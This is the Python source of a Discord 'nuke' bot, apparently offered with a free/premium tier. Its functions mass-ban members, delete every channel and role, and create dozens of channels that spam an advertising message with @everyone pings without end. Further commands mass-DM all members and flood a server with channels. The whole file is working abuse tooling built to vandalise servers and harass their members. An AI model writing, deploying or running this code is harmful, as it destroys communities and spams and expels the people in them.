import discord
from discord.ext import commands
from discord import app_commands
from colorama import init, Fore as cc
from os import name as os_name, system, environ
from sys import exit
import random
import asyncio
import sqlite3

init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')

baner = f'''
{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}https://github.com/Sigma-cc'''

SPAM_MESSAGE = "# 010101010-00-0-00-000100101011010101010101011001910101010010101010101001010 FKD BY WEPAIDDDDD GET BACKKKK https://discord.gg/wepaid @everyone @everyone @everyone"

# Database setup
DB_PATH = "bot_data.db"

def setup_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS premium_users (user_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

def is_premium(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT 1 FROM premium_users WHERE user_id = ?", (user_id,))
    res = cur.fetchone()
    conn.close()
    return res is not None

def add_premium(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO premium_users (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()

setup_db()

async def delete_all_channels(guild):
    tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)

async def delete_all_roles(guild):
    tasks = [role.delete() for role in guild.roles if role.name != "@everyone" and not role.managed]
    await asyncio.gather(*tasks, return_exceptions=True)

async def ban_all_members(guild):
    tasks = [member.ban() for member in guild.members if member != guild.me and member != guild.owner]
    await asyncio.gather(*tasks, return_exceptions=True)

async def spam_task(channel, message, count=None):
    if count:
        for _ in range(count):
            try:
                await channel.send(message)
                await asyncio.sleep(0.5)
            except: break
    else:
        while True:
            try:
                await channel.send(message)
                await asyncio.sleep(0.5)
            except: break

async def nuke_guild(guild, custom_message=None, custom_channel_name=None):
    msg = custom_message or SPAM_MESSAGE
    await ban_all_members(guild)
    await delete_all_channels(guild)
    await delete_all_roles(guild)
    
    default_names = ["[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊", "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓", "[😭] 𝐅𝐊𝐃 𝐁𝐘 𝐖𝐄𝐏𝐀𝐈𝐃", "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"]
    
    for _ in range(50):
        try:
            name = custom_channel_name or random.choice(default_names)
            channel = await guild.create_text_channel(name=name)
            asyncio.create_task(spam_task(channel, msg))
        except: continue

# Main entry point
token = environ.get('DISCORD_BOT_TOKEN')
prefix = environ.get('DISCORD_PREFIX', '.')

class MyBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=prefix, intents=discord.Intents.all())

    async def setup_hook(self):
        await self.tree.sync()

client = MyBot()

@client.event
async def on_ready():
    clear()
    print(baner)
    
    # Set streaming status
    activity = discord.Streaming(
        name=".gg/wepaid JOIN NOW",
        url="https://www.twitch.org/4TBSPAAZ"
    )
    await client.change_presence(activity=activity)
    
    print(f'''
{c}--------------------------------------------
{g}[+] Logged in as {client.user}
{y}[!] Slash Commands Enabled
{y}[!] Status: Streaming .gg/wepaid JOIN NOW
{c}--------------------------------------------''')

# --- Slash Commands ---

@client.tree.command(name="nuke", description="Full server nuke (Free - uses default message)")
async def nuke_slash(interaction: discord.Interaction):
    await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
    await nuke_guild(interaction.guild)

@client.tree.command(name="custom_nuke", description="Full server nuke with custom message & channel names (Premium)")
@app_commands.describe(message="Custom spam message", channel_name="Custom channel names")
async def custom_nuke_slash(interaction: discord.Interaction, message: str, channel_name: str = None):
    if not is_premium(interaction.user.id):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    await interaction.response.send_message("🚀 Custom Nuke Started!", ephemeral=True)
    await nuke_guild(interaction.guild, message, channel_name)

@client.tree.command(name="spam", description="Spam current channel (Premium)")
@app_commands.describe(message="Message to spam", amount="How many times (blank for infinite)")
async def spam_slash(interaction: discord.Interaction, message: str, amount: int = None):
    if not is_premium(interaction.user.id):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    await interaction.response.send_message("💥 Spam Started!", ephemeral=True)
    asyncio.create_task(spam_task(interaction.channel, message, amount))

@client.tree.command(name="massdm", description="DM all members (Premium)")
@app_commands.describe(message="Message to send")
async def massdm_slash(interaction: discord.Interaction, message: str):
    if not is_premium(interaction.user.id):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    await interaction.response.send_message("📩 Mass DM Started!", ephemeral=True)
    for member in interaction.guild.members:
        if member != client.user and not member.bot:
            try: await member.send(message)
            except: continue

@client.tree.command(name="flood", description="Flood with channels (Premium)")
@app_commands.describe(name="Channel names", amount="Amount (max 100)")
async def flood_slash(interaction: discord.Interaction, name: str, amount: int = 50):
    if not is_premium(interaction.user.id):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    await interaction.response.send_message("🌊 Flooding...", ephemeral=True)
    for _ in range(min(amount, 100)):
        try: await interaction.guild.create_text_channel(name=name)
        except: break

@client.tree.command(name="add_premium", description="Grant lifetime premium")
async def add_premium_slash(interaction: discord.Interaction, user: discord.User):
    if not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
    add_premium(user.id)
    await interaction.response.send_message(f"✅ {user.name} is now Premium!", ephemeral=True)

# --- Prefix Commands ---

@client.command()
async def nuke(ctx):
    print(f'{y}[!] Nuke command executed in {ctx.guild.name} by {ctx.author}')
    await nuke_guild(ctx.guild)

@client.command()
async def custom_nuke(ctx, message: str, channel_name: str = None):
    if not is_premium(ctx.author.id):
        return await ctx.send("❌ Premium Only!")
    print(f'{y}[!] Custom Nuke command executed in {ctx.guild.name} by {ctx.author}')
    await nuke_guild(ctx.guild, message, channel_name)

@client.command()
async def spam(ctx, amount: int, *, message: str):
    if not is_premium(ctx.author.id):
        return await ctx.send("❌ Premium Only!")
    asyncio.create_task(spam_task(ctx.channel, message, amount))

@client.command()
async def massdm(ctx, *, message: str):
    if not is_premium(ctx.author.id):
        return await ctx.send("❌ Premium Only!")
    for member in ctx.guild.members:
        if member != client.user and not member.bot:
            try: await member.send(message)
            except: continue

@client.command()
async def flood(ctx, amount: int, *, name: str):
    if not is_premium(ctx.author.id):
        return await ctx.send("❌ Premium Only!")
    for _ in range(min(amount, 100)):
        try: await ctx.guild.create_text_channel(name=name)
        except: break

try:
    client.run(token)
except Exception as e:
    print(f'{r}[!] Error: {e}')
